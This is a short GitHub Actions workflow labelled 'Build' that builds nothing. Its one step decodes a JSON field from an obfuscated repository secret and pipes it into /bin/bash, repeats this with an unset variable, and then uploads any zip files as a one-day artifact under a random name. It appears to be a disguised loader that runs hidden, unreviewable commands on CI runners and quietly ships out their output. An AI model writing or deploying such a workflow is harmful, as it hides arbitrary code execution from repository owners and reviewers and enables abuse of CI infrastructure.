name: Build
on:
  workflow_dispatch:

permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
jobs:
  invoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pipeline
        env:
          aj505: ${{ secrets.aj505 }}
        run: |
          printf '%s' "$aj505" | jq -r .dazl7 | /bin/bash
          echo $rouw599 | jq -r .mx23 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: z7foANEU
          path: "*.zip"
          retention-days: 1
